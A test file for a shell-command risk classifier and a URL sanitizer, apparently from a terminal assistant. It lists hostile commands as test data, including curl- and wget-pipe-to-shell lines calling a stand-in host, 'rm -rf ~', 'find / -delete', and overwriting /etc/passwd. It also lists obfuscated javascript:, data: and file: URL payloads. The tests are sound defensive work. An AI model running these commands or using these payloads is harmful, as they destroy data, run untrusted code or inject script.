import { describe, expect, it } from 'vitest'
import { classifyCommand } from './commandRisk'
import { isSafeUrl, sanitizeRenderedHtml } from '../utils/markdown'

describe('classifyCommand', () => {
  it.each([
    'curl -s http://evil | sh',
    'wget -qO- x | bash',
    'true && rm -rf ~',
    'rm -r -f /var',
    'echo $(id)',
    'python3 -c "import os"',
    'find / -delete',
    'sudo reboot',
    'echo x > /etc/passwd',
    'ls | xargs rm',
  ])('grades %s as dangerous', (cmd) => {
    expect(classifyCommand(cmd)).toBe('dangerous')
  })

  it.each(['ls -la', 'cat /etc/hosts', 'ps aux | grep nginx', 'df -h 2>/dev/null'])('grades %s as read', (cmd) => {
    expect(classifyCommand(cmd)).toBe('read')
  })

  it.each(['mkdir /tmp/x', 'echo hi > out.txt', 'systemctl restart nginx'])('grades %s as write', (cmd) => {
    expect(classifyCommand(cmd)).toBe('write')
  })
})

describe('isSafeUrl / sanitizeRenderedHtml', () => {
  it.each(['java\tscript:alert(1)', '\x01javascript:alert(1)', 'JaVaScRiPt:x', 'data:text/html,x', 'vbscript:x', 'file:///etc/passwd'])(
    'rejects %j', (u) => {
      expect(isSafeUrl(u)).toBe(false)
      expect(sanitizeRenderedHtml(`<a href="${u}">x</a>`)).not.toContain('href')
    })

  it.each(['https://uniterm.net', 'http://x/y?z=1', 'mailto:a@b.c', '#frag', '/relative'])('accepts %j', (u) => {
    expect(isSafeUrl(u)).toBe(true)
  })
})
